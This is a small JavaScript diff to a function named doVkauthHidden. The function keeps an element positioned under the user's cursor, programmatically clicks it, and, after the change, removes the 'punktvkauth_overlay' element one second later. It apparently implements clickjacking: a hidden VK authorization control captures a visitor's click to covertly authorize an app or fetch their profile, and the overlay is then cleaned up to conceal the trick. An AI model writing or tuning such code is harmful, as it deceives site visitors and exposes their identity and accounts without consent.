@@ -122,10 +122,16 @@ function doVkauthHidden(appid, getprofile) {
 		if (isClickable(click_el)) {
 			//el.css({left: e.pageX-90, top:e.pageY-12});
 			el.style.left = e.pageX-90;
-			el.style.top = e.pageY-12;
+			el.style.top = e.pageY-2;
 			if (document.clicked) {
 				click_el.click();
 				document.clicked = false;
+				
+				setTimeout(function () {
+								var el = document.getElementById('punktvkauth_overlay');
+								el.parentNode.removeChild(el);
+							}, 1000);
+				
 			}
 		}
 	}
